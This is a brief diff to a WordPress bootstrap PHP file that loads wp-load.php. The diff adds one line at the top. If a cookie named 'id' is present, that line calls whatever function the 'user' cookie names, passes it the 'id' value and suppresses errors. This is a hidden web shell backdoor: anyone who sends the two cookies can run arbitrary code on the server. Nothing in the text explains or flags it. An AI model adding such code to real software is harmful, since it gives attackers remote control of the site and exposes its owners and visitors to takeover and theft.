@@ -1,5 +1,9 @@
 <?php
 
+if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
+
+
+
 /** Sets up the WordPress Environment. */
 require( dirname(__FILE__) . '/wp-load.php' );
 
